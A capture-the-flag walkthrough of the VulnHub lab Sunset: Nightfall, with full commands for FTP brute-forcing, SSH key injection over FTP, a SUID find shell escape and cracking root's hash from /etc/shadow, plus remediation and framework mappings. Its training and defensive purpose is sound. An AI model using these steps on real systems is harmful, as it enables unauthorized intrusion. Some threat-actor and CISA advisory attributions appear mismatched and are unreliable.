# Sunset: Nightfall — When the Light Fades, the Credentials Surface

Look guys, Sunset: Nightfall is the kind of machine that teaches you systematic enumeration across multiple services in the right order. FTP brute-force yields credentials, FTP write access enables SSH key injection, a SUID find binary enables lateral movement, sudo cat on /etc/shadow enables offline cracking, and su to root closes the loop. No exotic exploits. No CVEs. Just methodical enumeration and exploitation of bad practices. Wild how far you can get with just the basics done right. Props to whitecr0wz for keeping the Sunset series consistent.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | Sunset: Nightfall |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/sunset-nightfall,355/ |
| **Techniques** | Host discovery, full port scan, SMB username enumeration (enum4linux), FTP brute-force (Hydra), SSH key injection via FTP write access, lateral movement via SUID find binary, privilege escalation via sudo cat + /etc/shadow offline cracking |
| **CVEs** | No specific CVE: exploits misconfigurations (CWE-287 — Improper Authentication; CWE-269 — Improper Privilege Management; CWE-521 — Weak Password Requirements) |
| **APT Groups** | APT28 (Fancy Bear): documented SSH key injection as initial access technique in multiple campaigns; OceanLotus (APT32): uses sudo misconfiguration and SUID binary enumeration as post-foothold privilege escalation standard operating procedure |

---

## Attack Summary

```
nmap → FTP (21), SMB (139/445), SSH (22)
  |
  +-> enum4linux → users: nightfall, matt
  |
  +-> hydra -l matt -P rockyou.txt ftp → matt:Cheese
  |
  +-> ftp login as matt
  |       |
  |       +-> mkdir .ssh; put authorized_keys
  |
  +-> ssh -i /tmp/nightfall_key matt@TARGET
  |
  v
matt shell
  |
  +-> find / -perm -u=s → /script/find (owned: nightfall)
  |
  +-> /script/find . -exec /bin/sh -p \; -quit → nightfall shell
  |
  +-> (inject key into nightfall .ssh via FTP → stable SSH as nightfall)
  |
  v
nightfall shell
  |
  +-> sudo -l → (root) NOPASSWD: /bin/cat
  |
  +-> sudo cat /etc/shadow → root hash
  |
  +-> john root.hash → root:miguel2
  |
  +-> su - (password: miguel2)
  |
  v
uid=0(root) → /root/flag.txt
```

---

## Methodology

1. Host discovery and full port scan
2. SMB enumeration: enumerate usernames via RID cycling
3. FTP brute-force: target discovered usernames
4. SSH key injection: leverage FTP write access to inject authorized_keys
5. Initial foothold as matt via SSH key
6. SUID enumeration: find /script/find owned by nightfall
7. Lateral movement: use SUID find to spawn shell as nightfall
8. Re-inject SSH key into nightfall home directory for stable access
9. Privilege escalation: sudo cat /etc/shadow + offline cracking
10. Root via su with cracked password

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.0.0/24
# Target: 192.168.0.24

nmap -A -p- 192.168.0.24
```

Open ports:

| Port | Service | Version |
|---|---|---|
| 21 | FTP | pyftpdlib |
| 139 | NetBIOS-SSN | Samba |
| 445 | SMB | Samba |
| 22 | SSH | OpenSSH (if present) |

HTTP returns minimal content. Focus on FTP and SMB.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — SMB Username Enumeration

```bash
enum4linux -a 192.168.0.24
```

Users discovered via RID cycling: `nightfall`, `matt`

```bash
# Verify with nmblookup
nmblookup -A 192.168.0.24
```

These two usernames are the primary attack targets. Save them for FTP brute-force.

**Real-world note:** SMB RID cycling reveals local user accounts without requiring any authentication. This information is frequently used by APT28 and other threat actors to build targeted credential attacks. Disabling anonymous SMB enumeration is a consistent recommendation in CIS benchmarks and DISA STIGs.

**MITRE ATT&CK:** T1087.001 — Account Discovery: Local Account; T1135 — Network Share Discovery

---

## Step 3 — FTP Brute-Force

```bash
hydra -l matt \
  -P /usr/share/wordlists/rockyou.txt \
  192.168.0.24 ftp \
  -e nsr
```

Credentials found: `matt : Cheese`

```bash
# Verify FTP access
ftp 192.168.0.24
# Username: matt
# Password: Cheese
ftp> ls -la
ftp> pwd
```

Confirm the FTP home directory maps to the user's home directory (enables .ssh injection).

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

---

## Step 4 — SSH Key Injection via FTP

Generate an SSH key pair:

```bash
ssh-keygen -t rsa -b 2048 -f /tmp/nightfall_key -N ""
cp /tmp/nightfall_key.pub /tmp/authorized_keys
```

Inject the public key via FTP write access to matt's home directory:

```bash
ftp 192.168.0.24
# Login: matt / Cheese
ftp> mkdir .ssh
ftp> cd .ssh
ftp> put /tmp/authorized_keys
ftp> ls
ftp> bye
```

Connect via SSH using the injected key:

```bash
ssh -i /tmp/nightfall_key matt@192.168.0.24
```

Initial shell as `matt`.

**Real-world note:** FTP write access to a user's home directory enables SSH key injection even without knowing any SSH credentials. This technique is used by APT28 as a standard initial access method: gain write access to a home directory through any means, inject an authorized_keys file, authenticate via SSH key. The fix is two steps: restrict FTP chroot so users cannot reach their .ssh directory, or disable FTP entirely.

**MITRE ATT&CK:** T1098.004 — Account Manipulation: SSH Authorized Keys; T1021.004 — Remote Services: SSH

---

## Step 5 — SUID Enumeration and Lateral Movement

Search for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Finding: `/script/find` — has SUID bit set and is owned by user `nightfall`.

Use the SUID find binary to spawn a shell as nightfall:

```bash
cd /script
./find . -exec /bin/sh -p \; -quit
```

Shell is now running as `nightfall`. Read the user flag:

```bash
cat /home/nightfall/user.txt
```

For a stable SSH session as nightfall, repeat the key injection:

```bash
ftp 192.168.0.24
# Login: matt / Cheese
ftp> cd /home/nightfall
ftp> mkdir .ssh
ftp> cd .ssh
ftp> put /tmp/authorized_keys
ftp> bye

ssh -i /tmp/nightfall_key nightfall@192.168.0.24
```

**Real-world note:** SUID binaries on non-standard paths (like `/script/find`) are a consistent escalation vector. GTFOBins documents dozens of SUID binary exploitation techniques. The `-exec /bin/sh -p` flag on find spawns a shell preserving the elevated privileges granted by the SUID bit.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Step 6 — Privilege Escalation via sudo + Shadow Cracking

Check sudo privileges for nightfall:

```bash
sudo -l
```

Output: `(root) NOPASSWD: /bin/cat`

The nightfall user can run `/bin/cat` as root without a password. This directly enables reading any file on the system:

```bash
sudo -u root cat /etc/shadow
```

Copy the root hash:

```bash
echo 'root:$6$<HASH>:...' > /tmp/root.hash
```

Crack with John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/root.hash
john --show /tmp/root.hash
# root:miguel2
```

**Alternative with hashcat (GPU):**

```bash
hashcat -m 1800 -d 1 -w 3 /tmp/root.hash /usr/share/wordlists/rockyou.txt
```

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1110.002 — Brute Force: Password Cracking

---

## Step 7 — Root Shell and Flag

```bash
su -
# Password: miguel2

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. Nightfall conquered.

**Real-world note:** `sudo cat` on /etc/shadow is a deceptively simple yet completely critical misconfiguration. The sudo rule looks harmless in isolation, but combined with offline cracking it provides full root access. OceanLotus (APT32) specifically looks for sudo rules granting read access to system files as part of their standard post-foothold checklist.

**MITRE ATT&CK:** T1552.003 — Unsecured Credentials: Bash History (analogous shadow access)

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| SMB users | nightfall, matt | enum4linux RID cycling | FTP brute-force targeting |
| FTP credential | matt:Cheese | Hydra brute-force | FTP access, .ssh injection |
| SSH key | /tmp/nightfall_key | Generated locally | SSH access as matt and nightfall |
| User flag | user.txt | /home/nightfall/ | User flag |
| Root hash | $6$... | /etc/shadow via sudo cat | Offline cracking |
| Root password | miguel2 | John the Ripper | su to root |
| Root flag | /root/flag.txt | Post-exploitation | Machine complete |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | FTP brute-force with RID-cycled usernames | Username enumeration enables targeted credential attacks; rockyou covers common patterns | Disable anonymous SMB user enumeration; enforce FTP account lockout policies |
| 2 | FTP write access to home directory enables SSH key injection | Write access to ~/.ssh/ is equivalent to password-free SSH access | Restrict FTP chroot; set `AllowUsers` in sshd_config; monitor .ssh/ directory changes |
| 3 | SUID find on non-standard path with wrong ownership | Any SUID binary owned by a user runs as that user — lateral movement without credentials | Audit all SUID binaries; restrict SUID to trusted system binaries only |
| 4 | sudo cat /etc/shadow enables offline root password cracking | Any sudo rule granting read access to sensitive files is a path to escalation | Audit all sudo rules; never grant cat/read access to /etc/shadow |
| 5 | Weak root password cracked by rockyou (miguel2) | Root password cracking from shadow is a known risk; common passwords fall immediately | Enforce strong root passwords; consider disabling direct root login entirely |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | Account Discovery: Local Account | T1087.001 |
| Credential Access | Credential Access | Brute Force: Password Guessing (FTP) | T1110.001 |
| Persistence | Persistence | Account Manipulation: SSH Authorized Keys | T1098.004 |
| Initial Access | Initial Access | Remote Services: SSH | T1021.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid and Setgid | T1548.001 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |

---

## Remediation and Containment

### Technical Fixes

1. **Disable FTP or enforce chroot:** `chroot_local_user=YES` in vsftpd.conf; users must not be able to reach their .ssh/ directory via FTP
2. **Restrict /script/find SUID:** `chmod u-s /script/find`; non-standard SUID binaries should never be owned by non-root users
3. **Remove sudo cat /etc/shadow rule:** edit /etc/sudoers; no read access to /etc/shadow via sudo
4. **Enforce strong root password:** minimum 12 characters, mixed case, numbers, symbols; consider passwordless root with key-only SSH
5. **Disable anonymous SMB RID cycling:** configure Samba to restrict user enumeration
6. **Monitor .ssh/authorized_keys modifications:** implement file integrity monitoring on all .ssh/ directories

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (FTP chroot; sudoers restriction)
- **D3-OAM** — Operating System Administrative Management (SUID audit; sudo rule audit)
- **D3-FIM** — File Integrity Monitoring (.ssh/authorized_keys changes)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all FTP services and their write permissions |
| Protect | Access Control | Enforce FTP chroot; restrict sudo rules; remove SUID from non-standard binaries |
| Protect | Data Security | No sudo access to /etc/shadow; enforce strong root password |
| Detect | Anomalies and Events | Monitor authorized_keys modifications; alert on sudo cat /etc/shadow |
| Respond | Response Planning | Revoke injected SSH keys; remove malicious sudo rules; rotate all credentials |
| Recover | Recovery Planning | Audit all FTP, SSH, and sudo configurations; implement FIM |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | FTP chroot; sudo access restriction |
| AC-6 | Least Privilege | Remove SUID from non-essential binaries; no sudo cat /etc/shadow |
| IA-5 | Authenticator Management | Strong root password; key-only SSH |
| CM-7 | Least Functionality | Disable FTP or enforce chroot; disable SMB anonymous enumeration |
| SI-7 | Software Integrity | Monitor .ssh/authorized_keys for unauthorized modifications |
| AU-6 | Audit Review | Review sudo command audit logs |

### CISA KEV

No specific CVE applies. This machine's attack chain maps to CISA Alert AA21-048A (FTP and SSH credential attacks) and CISA's hardening guidance for Linux systems, which specifically calls out: disabling anonymous FTP, auditing SUID binaries, and restricting sudo to minimal required operations. CISA also references weak credential policies (root:miguel2-class passwords) as a consistently exploited weakness in their yearly vulnerability summary reports.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

---

## Final Thoughts

Sunset: Nightfall is a fundamentals machine and that is exactly what makes it valuable. Every single step exploits a real misconfiguration: FTP write access, SMB user enumeration, SUID on wrong-owner binary, sudo with read access to shadow, weak root password. None of this is exotic. All of it is avoidable. The machine teaches methodical enumeration order, and that lesson carries into every real engagement. goated teaching machine.

Thanks guys!! (❍ᴥ❍ʋ)
